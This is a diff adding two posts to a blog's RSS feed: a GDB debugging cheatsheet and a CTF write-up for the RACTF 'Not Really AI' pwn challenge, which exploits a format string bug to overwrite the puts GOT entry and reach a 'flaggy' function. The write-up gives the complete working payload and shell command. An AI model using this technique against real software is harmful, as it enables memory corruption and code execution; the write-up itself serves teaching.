@@ -18,5 +18,238 @@
             <content type="html"><![CDATA[]]></content>
         </item>
         
+        <item>
+            <title>GDB Cheatsheet</title>
+            <link>https://yusufhegazy.github.io/posts/gdb-cheatsheet/</link>
+            <pubDate>Tue, 18 Aug 2020 13:56:57 +0000</pubDate>
+            
+            <guid>https://yusufhegazy.github.io/posts/gdb-cheatsheet/</guid>
+            <description>Data:
+ disas main to disassemble function x/50wx $esp examine 50 words in hex starting from esp x/50i $eip examine 50 instructions from eip x anything examine address and show it’s contents info variables varname will show any variable address (for global!) info functions to list all functions info frame shows the saved RTN address under &amp;ldquo;saved eip&amp;rdquo; info proc map shows memory map ctx shows general info about everything (works in gef only)    Flow</description>
+            <content type="html"><![CDATA[<ul>
+<li>
+<p>Data:</p>
+<ul>
+<li><code>disas main</code> to disassemble function</li>
+<li><code>x/50wx $esp</code> e<strong>x</strong>amine 50 <strong>w</strong>ords in <strong>h</strong>ex starting from <strong>esp</strong></li>
+<li><code>x/50i $eip</code> examine 50 instructions from eip</li>
+<li><code>x anything</code> examine address and show it’s contents</li>
+<li><code>info variables varname</code> will show any variable address (for global!)</li>
+<li><code>info functions</code> to list all functions</li>
+<li><code>info frame</code> shows the saved RTN address under &ldquo;saved eip&rdquo;</li>
+<li><code>info proc map</code> shows memory map</li>
+<li><code>ctx</code> shows general info about everything <em>(works in gef only)</em></li>
+</ul>
+</li>
+<li>
+<p>Flow</p>
+<ul>
+<li><code>b *address</code> or <code>b *function&lt;+number&gt;</code></li>
+<li><code>j *address</code> <em>to jump</em></li>
+<li><code>si</code> <strong>s</strong>tep <strong>i</strong>nstruction</li>
+<li><code>ni</code> step instruction and stepover functions</li>
+</ul>
+</li>
+<li>
+<p>Hook Stops
+we use these to execute certain commands everytime our program flow stops (ex: breakpoints, steps)</p>
+<ul>
+<li>to define a hook stop we run the following:</li>
+</ul>
+</li>
+</ul>
+<pre><code>define hook-stop
+&gt;info registers
+&gt;x/24wx $esp
+&gt;x/2i $eip
+&gt;end
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>Not Really AI (Pwn - 200 Points)</title>
+            <link>https://yusufhegazy.github.io/posts/ctf-writeup/</link>
+            <pubDate>Tue, 09 Jun 2020 17:49:21 +0000</pubDate>
+            
+            <guid>https://yusufhegazy.github.io/posts/ctf-writeup/</guid>
+            <description>Not Really AI (Pwn - 200 Points) Little Background This is a Binary exploitaion challenge, based around a format string vulnerability.
+ Misusage of the libc printf() function can lead to serious information leakage and even code execution. when we pass one argument (for example printf(foo)) we can:  leak stack addresses using %x or %p format specifiers. overwrite any pointer&amp;rsquo;s value using %n specifier (note that we can&amp;rsquo;t overwrite plain stack addresses as the %n format specifier can only overwrite by reference and not by value)    For more information on format strings please check this awesome resource</description>
+            <content type="html"><![CDATA[<h1 id="not-really-ai-pwn---200-points">Not Really AI (Pwn - 200 Points)</h1>
+<h2 id="little-background">Little Background</h2>
+<p>This is a Binary exploitaion challenge, based around a format string vulnerability.</p>
+<ul>
+<li>Misusage of the libc <code>printf()</code> function can lead to serious information leakage and even code execution.</li>
+<li>when we pass one argument (for example <code>printf(foo)</code>) we can:
+<ul>
+<li>leak stack addresses using <code>%x</code> or <code>%p</code> format specifiers.</li>
+<li>overwrite any pointer&rsquo;s value using <code>%n</code> specifier (note that we can&rsquo;t overwrite plain stack addresses as the %n format specifier can only overwrite by reference and not by value)</li>
+</ul>
+</li>
+</ul>
+<p>For more information on format strings please check <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf">this awesome resource</a></p>
+<h2 id="analyzing-the-binary">Analyzing the Binary</h2>
+<p>we fire up GDB and list all our functions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  info functions       
+All defined functions: 
+Non<span style="color:#f92672">-</span>debugging symbols:
+<span style="color:#ae81ff">0x08049000</span>  _init
+<span style="color:#ae81ff">0x08049030</span>  printf<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08049040</span>  fgets<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08049050</span>  getegid<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08049060</span>  puts<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08049070</span>  system<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08049080</span>  __libc_start_main<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x08049090</span>  setvbuf<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080490a0</span>  setresgid<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080490b0</span>  _start
+<span style="color:#ae81ff">0x080490f0</span>  _dl_relocate_static_pie
+<span style="color:#ae81ff">0x08049100</span>  __x86.get_pc_thunk.bx
+<span style="color:#ae81ff">0x08049110</span>  deregister_tm_clones
+<span style="color:#ae81ff">0x08049150</span>  register_tm_clones
+<span style="color:#ae81ff">0x08049190</span>  __do_global_dtors_aux
+<span style="color:#ae81ff">0x080491c0</span>  frame_dummy
+<span style="color:#ae81ff">0x080491c2</span>  response
+<span style="color:#ae81ff">0x08049245</span>  flaggy
+<span style="color:#ae81ff">0x08049270</span>  main
+<span style="color:#ae81ff">0x080492eb</span>  __x86.get_pc_thunk.ax
+<span style="color:#ae81ff">0x080492f0</span>  __libc_csu_init
+<span style="color:#ae81ff">0x08049350</span>  __libc_csu_fini
+<span style="color:#ae81ff">0x08049351</span>  __x86.get_pc_thunk.bp
+<span style="color:#ae81ff">0x08049358</span>  _fini
+</code></pre></div><p>we notice three non-standard functions above which are:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ae81ff">0x080491c2</span>  response
+<span style="color:#ae81ff">0x08049245</span>  flaggy
+<span style="color:#ae81ff">0x08049270</span>  main
+</code></pre></div><p>by inspecting the disassembly for these three functions we find out that:</p>
+<ul>
+<li>main function will call response function</li>
+<li>response function maybe vulnerable to a format string vulnerability (since there is a printf call)</li>
+<li>the flaggy function is a dead code, our goal is to call it.</li>
+</ul>
+<p>so let&rsquo;s start by running some input on the binary, let&rsquo;s test with a couple of <code>%x</code>'s:</p>
+<pre><code>hegz@hegzbox:~/ractf/Not_Really_AI$ ./nra
+How are you finding RACTF?
+%x %x %x %x    
+I am glad you
+200 f7fb9580 80491d1 25207825
+
+We hope you keep going!
+</code></pre><p>bingo!
+we can leak stack addresses.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>since this binary is vulnerable to a format strings attack, we can use the <code>%n</code> specifer to overwrite any pointer value on the stack.
+But can we really overwrite the return address?
+The answer is No, we can&rsquo;t do that since it is not a pointer, it&rsquo;s a value and we can&rsquo;t overwrite values on the stack using <code>%n</code></p>
+<p>Our approach to this challenge will be through overwriting the &ldquo;Global Offset Table&rdquo;&hellip;
+to put it simply, the Global Offset Table is somewhere in the bss section of the binary where shared library functions are mapped to their addresses.
+If we can overwrite one of these function addresses (for example <code>puts()</code> GOT address) then, when we want to execute this function (the <code>puts</code>) it will instead execute our arbitary function.</p>
+<p>we check our vulnrable function for candiadtes:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  disas response 
+Dump of assembler code <span style="color:#66d9ef">for</span> function response:
+   <span style="color:#ae81ff">0x080491c2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;:</span>     push   ebp
+   <span style="color:#ae81ff">0x080491c3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;:</span>     mov    ebp,esp
+   <span style="color:#ae81ff">0x080491c5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">&gt;:</span>     push   ebx
+   <span style="color:#ae81ff">0x080491c6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;:</span>     sub    esp,<span style="color:#ae81ff">0x204</span>
+   <span style="color:#ae81ff">0x080491cc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8049100</span> <span style="color:#f92672">&lt;</span>__x86.get_pc_thunk.bx<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x080491d1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;:</span>    add    ebx,<span style="color:#ae81ff">0x2e2f</span>
+   <span style="color:#ae81ff">0x080491d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x080491da</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">&gt;:</span>    lea    eax,[ebx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1ff8</span>]
+   <span style="color:#ae81ff">0x080491e0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;:</span>    push   eax
+   <span style="color:#ae81ff">0x080491e1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">31</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8049060</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x080491e6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x080491e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;:</span>    mov    eax,DWORD PTR [ebx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>]
+   <span style="color:#ae81ff">0x080491ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;:</span>    mov    eax,DWORD PTR [eax]
+   <span style="color:#ae81ff">0x080491f1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0x4</span>
+   <span style="color:#ae81ff">0x080491f4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">50</span><span style="color:#f92672">&gt;:</span>    push   eax
+   <span style="color:#ae81ff">0x080491f5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">51</span><span style="color:#f92672">&gt;:</span>    push   <span style="color:#ae81ff">0x200</span>
+   <span style="color:#ae81ff">0x080491fa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">56</span><span style="color:#f92672">&gt;:</span>    lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x208</span>]
+   <span style="color:#ae81ff">0x08049200</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">62</span><span style="color:#f92672">&gt;:</span>    push   eax
+   <span style="color:#ae81ff">0x08049201</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">63</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8049040</span> <span style="color:#f92672">&lt;</span>fgets<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x08049206</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">68</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x08049209</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">71</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x0804920c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;:</span>    lea    eax,[ebx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1fdd</span>]
+   <span style="color:#ae81ff">0x08049212</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;:</span>    push   eax
+   <span style="color:#ae81ff">0x08049213</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">81</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8049060</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x08049218</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;:</span>    add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x0804921b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;:</span>    sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x0804921e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">92</span><span style="color:#f92672">&gt;:</span>    lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x208</span>]
+   <span style="color:#ae81ff">0x08049224</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;:</span>    push   eax
+   <span style="color:#ae81ff">0x08049225</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">99</span><span style="color:#f92672">&gt;:</span>    call   <span style="color:#ae81ff">0x8049030</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x0804922a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">104</span><span style="color:#f92672">&gt;:</span>   add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x0804922d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">107</span><span style="color:#f92672">&gt;:</span>   sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x08049230</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">110</span><span style="color:#f92672">&gt;:</span>   lea    eax,[ebx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1fcf</span>]
+   <span style="color:#ae81ff">0x08049236</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;:</span>   push   eax
+   <span style="color:#ae81ff">0x08049237</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">117</span><span style="color:#f92672">&gt;:</span>   call   <span style="color:#ae81ff">0x8049060</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>plt<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x0804923c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">122</span><span style="color:#f92672">&gt;:</span>   add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x0804923f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">125</span><span style="color:#f92672">&gt;:</span>   nop
+   <span style="color:#ae81ff">0x08049240</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">126</span><span style="color:#f92672">&gt;:</span>   mov    ebx,DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
+   <span style="color:#ae81ff">0x08049243</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">129</span><span style="color:#f92672">&gt;:</span>   leave  
+   <span style="color:#ae81ff">0x08049244</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">130</span><span style="color:#f92672">&gt;:</span>   ret    
+End of assembler dump.
+</code></pre></div><p>we see a <code>puts</code> call after the vulnerable <code>printf</code> function, that&rsquo;s our candiadte.
+Alright, now it&rsquo;s time to collect all the pieces of the puzzle.</p>
+<p>In order to start writing our exploit, we will need two pieces of information:</p>
+<ol>
+<li>The memory address we are overwriting &ndash;&gt; puts GOT address</li>
+<li>The memory address we are overwriting with &ndash;&gt; flaggy</li>
+</ol>
+<p>to get the puts GOT address we can disassemble the puts address located at response&lt;+117&gt;:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  disas <span style="color:#ae81ff">0x8049060</span>
+Dump of assembler code <span style="color:#66d9ef">for</span> function puts<span style="color:#960050;background-color:#1e0010">@</span>plt:
+   <span style="color:#ae81ff">0x08049060</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;:</span>     jmp    DWORD PTR ds:<span style="color:#ae81ff">0x804c018</span>
+   <span style="color:#ae81ff">0x08049066</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">6</span><span style="color:#f92672">&gt;:</span>     push   <span style="color:#ae81ff">0x18</span>
+   <span style="color:#ae81ff">0x0804906b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;:</span>    jmp    <span style="color:#ae81ff">0x8049020</span>
+End of assembler dump.
+</code></pre></div><p>then we examine the destination address of the jump instrcution above to make sure its the GOT address:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x <span style="color:#ae81ff">0x804c018</span>
+<span style="color:#ae81ff">0x804c018</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#960050;background-color:#1e0010">@</span>got.plt<span style="color:#f92672">&gt;:</span>       <span style="color:#ae81ff">0x08049066</span>
+</code></pre></div><p>and voila, <code>0x804c018</code> is our desired address!</p>
+<p>now we need the flaggy function address:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  x flaggy
+<span style="color:#ae81ff">0x8049245</span> <span style="color:#f92672">&lt;</span>flaggy<span style="color:#f92672">&gt;:</span>     <span style="color:#ae81ff">0x53e58955</span>
+</code></pre></div><p>and our address is <code>0x8049245</code>
+(note: don&rsquo;t confuse the address with its value, i.e: in the above snippet we have two hex numbers where <code>0x8049245</code> is the address/pointer and <code>0x53e58955</code> is the value of that pointer/address)</p>
+<h3 id="time-to-write-our-exploit">Time to write our Exploit!</h3>
+<p>our exploit will look like this (Abstracted):
+<code>[Address_of_puts][Address_of_flaggy][Address_of_puts entry number on the stack]</code>
+let&rsquo;s dig a bit deeper into each of these parts:</p>
+<hr>
+<ol>
+<li><code>[Address_of_puts]:</code>
+this is the simplest of the three, and it&rsquo;s basically our GOT puts address which we obtained above, but encoded in little endian</li>
+</ol>
+<pre><code>Address_of_puts = \x18\xc0\x04\x08 
+</code></pre><hr>
+<ol start="2">
+<li><code>[Address_of_flaggy]:</code>
+if we recall back, we mentioned that the %n specifier will write the printed character length to a specified pointer.
+our goal here is to encode the Address of flaggy function as a padded address, for example we want to encode this address <code>0x8049245</code>
+the format will be: <code>%(integer value of the address - 4)x</code> where the 4 is the length of the [Address_of_puts]
+using any calculator or just python, we can calculate the integer value of any hex address:</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> int(<span style="color:#ae81ff">0x8049245</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>)
+<span style="color:#ae81ff">134517313</span>
+</code></pre></div><p>so our final payload will be: <code>%134517313x</code></p>
+<hr>
+<ol start="3">
+<li><code>[Address_of_puts entry number on the stack]:</code>
+to calculate the offset of puts in our printf stack leak, we use an Egg i.e: AAAA, and follow it with some <code>%x</code>'s until we can locate it&rsquo;s offset.</li>
+</ol>
+<pre><code>hegz@hegzbox:~/ractf/Not_Really_AI$ ./nra 
+How are you finding RACTF?
+AAAA %x %x %x %x %x %x %x %x
+I am glad you
+AAAA 200 f7fb9580 80491d1 41414141 20782520 25207825 78252078 20782520
+</code></pre><p>we see that our offset is the 4th entry after the egg, so our payload will be: <code>%x %x %x %n</code> or we can use the special feautre of printf <code>%4$n</code> which does the same thing.</p>
+<hr>
+<p>full payload:
+<code>\x18\xc0\x04\x08%134517313x%4$n</code></p>
+<p>we will use echo to print and pipe it to the binary (we also escape the $ and append a \x0a for a newline):
+<code>echo -en \x18\xc0\x04\x08%134517313x%4\\$n\x0a | ./nra</code>
+a lot of blank spaces will be printed, and eventually our flag&hellip;
+<code>ractf{f0rmat_Str1nG_fuN}</code></p>
+]]></content>
+        </item>
+        
     </channel>
 </rss>
